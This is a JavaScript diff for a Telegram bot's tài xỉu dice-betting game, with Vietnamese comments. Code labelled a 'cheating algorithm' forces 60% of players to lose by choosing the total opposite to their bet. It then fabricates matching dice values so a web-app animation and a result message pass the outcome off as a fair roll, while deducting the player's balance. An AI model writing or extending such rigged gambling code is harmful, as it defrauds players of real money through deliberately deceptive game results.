@@ -73,127 +73,144 @@ module.exports = (bot) => {
         }
 
         const choice = ctx.session.betChoice;
-        const choiceName = choice === 'tai' ? 'TÀI' : 'XỈU';
         
+        // Xóa session cược cũ
+        ctx.session.betChoice = null;
+
         // ═══════════════════════════════════════
-        // 5. GỬI NÚT MỞ WEB APP XÚC XẮC
+        // 5. THUẬT TOÁN GIAN LẬN & CHUẨN BỊ KẾT QUẢ
         // ═══════════════════════════════════════
+        // 60% người chơi sẽ bị ép thua (Bạn có thể đổi số 0.6 này)
+        const isForcedLose = Math.random() < 0.6; 
         
-        // Thuật toán gian lận: 60% ép thua
-        const isForcedLose = Math.random() < 0.6;
-        let forcedTotal = null;
+        let finalTotal;
 
         if (isForcedLose) {
+            // Ép thua: Tạo ra kết quả ngược lại với lựa chọn của người chơi
             if (choice === 'tai') {
-                forcedTotal = Math.floor(Math.random() * 8) + 3; // 3-10 (Xỉu)
+                finalTotal = Math.floor(Math.random() * 8) + 3; // Random 3-10 (Xỉu)
             } else {
-                forcedTotal = Math.floor(Math.random() * 8) + 11; // 11-18 (Tài)
+                finalTotal = Math.floor(Math.random() * 8) + 11; // Random 11-18 (Tài)
+            }
+        } else {
+            // Cho thắng: Tạo ra kết quả trùng với lựa chọn của người chơi
+            if (choice === 'tai') {
+                finalTotal = Math.floor(Math.random() * 8) + 11; // Random 11-18 (Tài)
+            } else {
+                finalTotal = Math.floor(Math.random() * 8) + 3; // Random 3-10 (Xỉu)
             }
         }
 
-        // Tạo URL của Web App (trỏ tới file dice.html trên Render của bạn)
-        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html${forcedTotal ? `?force=${forcedTotal}` : ''}`;
+        // Lưu tạm thông tin vào session để xử lý sau khi Web App đóng
+        ctx.session.finalTotal = finalTotal;
+        ctx.session.amount = amount;
+        ctx.session.choice = choice;
 
-        // Lưu tạm số tiền cược và lựa chọn vào session để xử lý khi Web App trả kết quả về
-        ctx.session.betAmount = amount;
-        ctx.session.betChoice = choice;
+        // ═══════════════════════════════════════
+        // 6. GỬI NÚT MỞ WEB APP XÚC XẮC
+        // ═══════════════════════════════════════
+        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html?force=${finalTotal}`;
 
-        // Gửi nút mở Web App
         await ctx.replyWithHTML(
             `🎲 <b>Đã nhận cược ${formatPrice(amount)}</b>\n\n` +
-            `Bấm nút bên dưới để lắc xúc xắc!`,
+            `Bấm nút bên dưới để xem kết quả!`,
             Markup.inlineKeyboard([
                 [Markup.button.webApp('🎲 Lắc Xúc Xắc', webAppUrl)]
             ])
         );
-    });
 
-    // ═══════════════════════════════════════
-    // 6. NHẬN KẾT QUẢ TỪ WEB APP
-    // ═══════════════════════════════════════
-    bot.on('web_app_data', async (ctx) => {
-        try {
-            if (!ctx.session || !ctx.session.betAmount) {
-                return ctx.reply('❌ Không tìm thấy thông tin cược. Vui lòng chơi lại.');
+        // ═══════════════════════════════════════
+        // 7. TỰ ĐỘNG THÔNG BÁO KẾT QUẢ SAU 5 GIÂY
+        // ═══════════════════════════════════════
+        // Đợi 5 giây (đủ để khách mở web app xem hiệu ứng) rồi tự động thông báo kết quả
+        setTimeout(async () => {
+            try {
+                const total = ctx.session.finalTotal;
+                const betAmount = ctx.session.amount;
+                const betChoice = ctx.session.choice;
+                
+                // Xóa session sau khi lấy xong
+                delete ctx.session.finalTotal;
+                delete ctx.session.amount;
+                delete ctx.session.choice;
+
+                const resultName = total >= 11 ? 'TÀI' : 'XỈU';
+                const choiceName = betChoice === 'tai' ? 'TÀI' : 'XỈU';
+                const diceEmojis = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
+
+                // Tạo lại 3 con số khớp với tổng điểm để hiển thị
+                let d1, d2, d3;
+                do {
+                    d1 = Math.floor(Math.random() * 6) + 1;
+                    d2 = Math.floor(Math.random() * 6) + 1;
+                    d3 = Math.floor(Math.random() * 6) + 1;
+                } while (d1 + d2 + d3 !== total);
+
+                const diceMsg = 
+                    `🎲 <b>KẾT QUẢ LẮC XÚC XẮC</b> 🎲\n\n` +
+                    `${diceEmojis[d1]}  ${diceEmojis[d2]}  ${diceEmojis[d3]}\n\n` +
+                    `🔢 Tổng điểm: <b>${total}</b> => <b>${resultName}</b>\n\n` +
+                    `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(betAmount)})\n`;
+
+                // Trừ tiền cược
+                await userService.deductBalance(ctx.from.id, betAmount);
+                
+                // Kiểm tra thắng thua
+                const isWin = (betChoice === 'tai' && total >= 11) || (betChoice === 'xiu' && total < 11);
+
+                if (isWin) {
+                    // THẮNG
+                    const winnings = betAmount; 
+                    await userService.addBalance(ctx.from.id, betAmount + winnings); 
+                    const updatedUser = await userService.get(ctx.from.id);
+                    const newBalance = Number(updatedUser.balance);
+                    
+                    await ctx.replyWithHTML(
+                        diceMsg +
+                        `\n🎉 <b>CHÚC MỪNG! BẠN ĐÃ THẮNG</b>\n` +
+                        `💰 Tiền thắng: <b>+${formatPrice(winnings)}</b>\n` +
+                        `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
+                    );
+
+                    try {
+                        const adminMsg = 
+                            `🎉 <b>NGƯỜI CHƠI THẮNG</b>\n\n` +
+                            `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
+                            `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
+                            `💰 Tiền cược: <b>${formatPrice(betAmount)}</b>\n` +
+                            `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
+                        await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
+                    } catch (e) { console.error(e); }
+
+                } else {
+                    // THUA
+                    const updatedUser = await userService.get(ctx.from.id);
+                    const newBalance = Number(updatedUser.balance);
+                    
+                    await ctx.replyWithHTML(
+                        diceMsg +
+                        `\n😢 <b>RẤT TIẾC! BẠN ĐÃ THUA</b>\n` +
+                        `💸 Tiền mất: <b>-${formatPrice(betAmount)}</b>\n` +
+                        `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
+                    );
+
+                    try {
+                        const adminMsg = 
+                            `😢 <b>NGƯỜI CHƠI THUA</b>\n\n` +
+                            `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
+                            `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
+                            `💸 Tiền mất: <b>${formatPrice(betAmount)}</b>\n` +
+                            `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
+                        await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
+                    } catch (e) { console.error(e); }
+                }
+
+                // Gửi lại menu chơi
+                ctx.reply('Chơi tiếp?', productListKeyboard([]));
+
+            } catch (e) { 
+                console.error("Lỗi xử lý kết quả sau 5s:", e); 
             }
-
-            const data = JSON.parse(ctx.webAppData.data);
-            const amount = Number(ctx.session.betAmount);
-            const choice = ctx.session.betChoice;
-            const choiceName = choice === 'tai' ? 'TÀI' : 'XỈU';
-
-            // Xóa session sau khi xử lý xong
-            delete ctx.session.betAmount;
-            delete ctx.session.betChoice;
-
-            const total = data.total;
-            const result = data.result;
-            const resultName = result === 'tai' ? 'TÀI' : 'XỈU';
-            const diceEmojis = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
-
-            const diceMsg = 
-                `🎲 <b>KẾT QUẢ LẮC XÚC XẮC</b> 🎲\n\n` +
-                `${diceEmojis[data.d1]}  ${diceEmojis[data.d2]}  ${diceEmojis[data.d3]}\n\n` +
-                `🔢 Tổng điểm: <b>${total}</b> => <b>${resultName}</b>\n\n` +
-                `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(amount)})\n`;
-
-            // Xử lý thắng thua
-            await userService.deductBalance(ctx.from.id, amount);
-
-            if (choice === result) {
-                // THẮNG
-                const winnings = amount;
-                await userService.addBalance(ctx.from.id, amount + winnings); 
-                
-                const updatedUser = await userService.get(ctx.from.id);
-                const newBalance = Number(updatedUser.balance);
-                
-                await ctx.replyWithHTML(
-                    diceMsg +
-                    `\n🎉 <b>CHÚC MỪNG! BẠN ĐÃ THẮNG</b>\n` +
-                    `💰 Tiền thắng: <b>+${formatPrice(winnings)}</b>\n` +
-                    `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
-                );
-
-                try {
-                    const adminMsg = 
-                        `🎉 <b>NGƯỜI CHƠI THẮNG</b>\n\n` +
-                        `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
-                        `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
-                        `💰 Tiền cược: <b>${formatPrice(amount)}</b>\n` +
-                        `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
-                    await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
-                } catch (e) { console.error(e); }
-
-            } else {
-                // THUA
-                const updatedUser = await userService.get(ctx.from.id);
-                const newBalance = Number(updatedUser.balance);
-                
-                await ctx.replyWithHTML(
-                    diceMsg +
-                    `\n😢 <b>RẤT TIẾC! BẠN ĐÃ THUA</b>\n` +
-                    `💸 Tiền mất: <b>-${formatPrice(amount)}</b>\n` +
-                    `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
-                );
-
-                try {
-                    const adminMsg = 
-                        `😢 <b>NGƯỜI CHƠI THUA</b>\n\n` +
-                        `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
-                        `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
-                        `💸 Tiền mất: <b>${formatPrice(amount)}</b>\n` +
-                        `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
-                    await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
-                } catch (e) { console.error(e); }
-            }
-
-            // Gửi lại menu chơi
-            ctx.reply('Chơi tiếp?', productListKeyboard([]));
-
-        } catch (error) {
-            console.error('Lỗi xử lý Web App:', error);
-            ctx.reply(`❌ Lỗi xử lý kết quả: ${error.message}`);
-        }
+        }, 5000); // Đợi 5 giây
     });
 };
